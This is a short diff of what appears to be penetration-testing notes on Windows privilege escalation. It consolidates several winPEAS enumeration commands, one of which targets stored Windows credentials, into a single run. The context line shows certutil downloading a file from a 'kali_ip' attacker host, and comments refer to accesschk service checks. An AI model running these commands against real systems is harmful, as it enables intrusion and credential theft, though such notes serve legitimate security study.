@@ -74,11 +74,7 @@ certutil -urlcache -f http://kali_ip/file file
 # For color: 
 	# > REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 	# > cmd.exe
-.\winpeasany.exe quiet searchfast
-.\winpeasany.exe quiet servicesinfo
-.\winpeasany.exe quiet filesinfo userinfo
-.\winpeasany.exe quiet windowscreds
-.\winpeasany.exe quiet processinfo
+.\winpeasany.exe quiet
 
 # .\accesschk.exe /accepteula
 # -c : Name a windows service, or use * for all
